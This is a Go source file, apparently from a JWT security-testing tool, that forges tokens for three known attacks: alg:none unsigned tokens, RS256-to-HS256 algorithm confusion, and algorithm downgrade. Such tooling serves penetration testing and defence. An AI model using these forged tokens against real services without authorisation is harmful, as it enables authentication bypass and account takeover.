package attacker

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/ismailtsdln/JWTScout/internal/parser"
)

// AlgTest performs algorithm vulnerability testing
type AlgTest struct{}

// NewAlgTest creates a new algorithm tester
func NewAlgTest() *AlgTest {
	return &AlgTest{}
}

// TestResult represents the result of an algorithm test
type TestResult struct {
	TestName    string
	Description string
	Payload     string
	Success     bool
}

// TestAll runs all algorithm tests
func (at *AlgTest) TestAll(token *parser.JWTToken) []*TestResult {
	results := []*TestResult{}

	// Test alg:none
	if noneToken, err := at.CreateAlgNone(token); err == nil {
		results = append(results, &TestResult{
			TestName:    "alg:none Attack",
			Description: "Created unsigned token by setting algorithm to 'none'",
			Payload:     noneToken,
			Success:     true,
		})
	}

	// Test algorithm confusion (RS256 -> HS256)
	if token.Header.Alg == "RS256" || token.Header.Alg == "rs256" {
		if hsToken, err := at.CreateAlgConfusion(token); err == nil {
			results = append(results, &TestResult{
				TestName:    "Algorithm Confusion (RS256→HS256)",
				Description: "Converted RS256 token to HS256 for key confusion attack",
				Payload:     hsToken,
				Success:     true,
			})
		}
	}

	// Test algorithm downgrade
	if downgradeToken, err := at.TestDowngrade(token); err == nil {
		results = append(results, &TestResult{
			TestName:    "Algorithm Downgrade",
			Description: "Downgraded to weaker algorithm",
			Payload:     downgradeToken,
			Success:     true,
		})
	}

	return results
}

// CreateAlgNone creates a token with alg:none
func (at *AlgTest) CreateAlgNone(token *parser.JWTToken) (string, error) {
	// Create new header with alg:none
	newHeader := map[string]interface{}{
		"alg": "none",
		"typ": "JWT",
	}

	// Keep other header fields except alg and typ
	for k, v := range token.Header.Raw {
		if k != "alg" && k != "typ" {
			newHeader[k] = v
		}
	}

	// Encode header
	headerJSON, err := json.Marshal(newHeader)
	if err != nil {
		return "", err
	}

	// Encode payload
	payloadJSON, err := json.Marshal(token.Payload.Raw)
	if err != nil {
		return "", err
	}

	// Create token with alg:none (empty signature with trailing dot)
	headerB64 := parser.Base64URLEncode(headerJSON)
	payloadB64 := parser.Base64URLEncode(payloadJSON)

	// alg:none tokens should have an empty signature but keep the dot
	return headerB64 + "." + payloadB64 + ".", nil
}

// CreateAlgConfusion creates an HS256 variant for algorithm confusion attack
func (at *AlgTest) CreateAlgConfusion(token *parser.JWTToken) (string, error) {
	// Create new header with HS256
	newHeader := map[string]interface{}{
		"alg": "HS256",
		"typ": "JWT",
	}

	// Keep other header fields
	for k, v := range token.Header.Raw {
		if k != "alg" && k != "typ" {
			newHeader[k] = v
		}
	}

	// Encode header
	headerJSON, err := json.Marshal(newHeader)
	if err != nil {
		return "", err
	}

	// Encode payload
	payloadJSON, err := json.Marshal(token.Payload.Raw)
	if err != nil {
		return "", err
	}

	headerB64 := parser.Base64URLEncode(headerJSON)
	payloadB64 := parser.Base64URLEncode(payloadJSON)

	// Note: This creates an unsigned token - user would need to sign it with the public key
	return fmt.Sprintf("%s.%s.%s", headerB64, payloadB64, "SIGN_WITH_PUBLIC_KEY"), nil
}

// TestDowngrade attempts to downgrade the algorithm
func (at *AlgTest) TestDowngrade(token *parser.JWTToken) (string, error) {
	currentAlg := strings.ToUpper(token.Header.Alg)

	// Downgrade map
	downgrades := map[string]string{
		"RS512": "RS256",
		"RS384": "RS256",
		"ES512": "ES256",
		"ES384": "ES256",
		"HS512": "HS256",
		"HS384": "HS256",
	}

	downgraded, exists := downgrades[currentAlg]
	if !exists {
		return "", fmt.Errorf("no downgrade available for %s", currentAlg)
	}

	// Create new header with downgraded algorithm
	newHeader := map[string]interface{}{
		"alg": downgraded,
		"typ": "JWT",
	}

	for k, v := range token.Header.Raw {
		if k != "alg" && k != "typ" {
			newHeader[k] = v
		}
	}

	// Encode
	headerJSON, err := json.Marshal(newHeader)
	if err != nil {
		return "", err
	}

	payloadJSON, err := json.Marshal(token.Payload.Raw)
	if err != nil {
		return "", err
	}

	headerB64 := parser.Base64URLEncode(headerJSON)
	payloadB64 := parser.Base64URLEncode(payloadJSON)

	return fmt.Sprintf("%s.%s.%s", headerB64, payloadB64, "UNSIGNED"), nil
}
